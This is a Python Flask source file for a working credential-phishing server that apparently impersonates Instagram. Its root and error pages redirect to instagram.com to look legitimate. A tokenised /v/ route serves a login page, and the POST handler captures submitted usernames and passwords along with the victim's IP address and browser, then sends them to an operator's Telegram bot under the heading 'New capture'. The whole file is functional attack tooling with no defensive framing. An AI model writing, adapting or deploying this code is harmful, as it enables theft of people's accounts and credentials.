import os
import sys
import time
import logging
import threading
import httpx
from flask import Flask, request, render_template, redirect, jsonify
from datetime import datetime

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
    stream=sys.stdout,
)
log = logging.getLogger("web")

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
CHAT_ID = os.environ.get("CHAT_ID", "").strip()
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# ---------------- BOT THREAD START ----------------
_bot_thread_started = False

def _start_bot_thread_once():
    global _bot_thread_started
    if _bot_thread_started:
        return
    _bot_thread_started = True
    try:
        from bot import run_bot
        t = threading.Thread(target=run_bot, name="telegram-bot", daemon=True)
        t.start()
        log.info("bot background thread started")
    except Exception as e:
        log.exception("failed to start bot thread — %s", e)

_start_bot_thread_once()
# --------------------------------------------------


def send_to_bot(text: str) -> bool:
    if not BOT_TOKEN or not CHAT_ID:
        log.warning("send_to_bot: BOT_TOKEN/CHAT_ID missing — skipping")
        return False
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    for attempt in range(1, 4):
        try:
            r = httpx.post(TELEGRAM_API, json=payload, timeout=10)
            if r.status_code == 200:
                log.info("send_to_bot: ok (attempt %d)", attempt)
                return True
            log.error("send_to_bot: HTTP %d — %s (attempt %d)",
                      r.status_code, r.text[:200], attempt)
        except httpx.TimeoutException:
            log.warning("send_to_bot: timeout (attempt %d)", attempt)
        except Exception as e:
            log.warning("send_to_bot: err — %s (attempt %d)", e, attempt)
        if attempt < 3:
            time.sleep(1.5 * attempt)
    log.error("send_to_bot: all retries failed")
    return False


@app.errorhandler(404)
def not_found(e):
    return redirect("https://www.instagram.com")


@app.route("/")
def index():
    return redirect("https://www.instagram.com")


@app.route("/healthz")
def healthz():
    return jsonify(
        ok=bool(BOT_TOKEN and CHAT_ID),
        bot_token=bool(BOT_TOKEN),
        chat_id=bool(CHAT_ID),
        bot_thread=_bot_thread_started,
    )


@app.route("/v/<token>", methods=["GET"])
def landing(token: str):
    try:
        if not token or len(token) > 64:
            return redirect("https://www.instagram.com")
        return render_template("index.html", token=token)
    except Exception as e:
        log.exception("landing err — %s", e)
        return redirect("https://www.instagram.com")


@app.route("/v/<token>", methods=["POST"])
def capture(token: str):
    try:
        user = request.form.get("username", "").strip()
        pwd = request.form.get("password", "").strip()
        if not user or not pwd:
            return render_template("index.html", token=token)

        ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "-"
        ua = request.headers.get("User-Agent", "-")
        ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

        msg = (
            f"<b>🎣 New capture</b>\n"
            f"<b>Token:</b> <code>{token}</code>\n"
            f"<b>User:</b> <code>{user}</code>\n"
            f"<b>Pass:</b> <code>{pwd}</code>\n"
            f"<b>IP:</b> {ip}\n"
            f"<b>UA:</b> {ua[:120]}\n"
            f"<b>Time:</b> {ts}"
        )
        sent = send_to_bot(msg)
        log.info("capture: token=%s user=%s sent=%s", token, user, sent)
        return render_template("success.html")
    except Exception as e:
        log.exception("capture err — %s", e)
        return render_template("success.html")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, threaded=True)
